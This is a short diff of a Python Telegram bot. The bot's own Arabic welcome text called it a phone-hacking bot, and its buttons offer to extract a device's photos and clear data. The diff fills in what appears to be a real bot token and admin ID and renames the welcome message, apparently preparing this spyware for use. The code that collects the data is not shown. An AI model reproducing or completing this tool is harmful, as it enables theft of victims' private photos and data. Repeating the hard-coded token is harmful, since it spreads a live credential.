@@ -10,8 +10,8 @@ from colorama import Fore, Style, init
 
 init()  
 
-TOKEN = 'توكن بوتك' #توكن
-ADMIN_ID = ايديك 
+TOKEN = "8245800281:AAGdcKWcuL1Mzg91qkstpJXv_owtzryebCg"
+ADMIN_ID = 6332519968
 bot = TeleBot(TOKEN)
 
 required_libraries = ['telebot', 'colorama']
@@ -61,7 +61,7 @@ def send_media_from_directory(directory, count, message, media_type):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    welcome_text = "  هلا بك في بوت اختراق الهاتفي ابو ترب"
+    welcome_text = "LORD 72F"
     keyboard = types.InlineKeyboardMarkup()
     button1 = types.InlineKeyboardButton('سحب صور الهاتف', callback_data='extract_photos')
     button2 = types.InlineKeyboardButton('سحب ️', callback_data='clear_data')
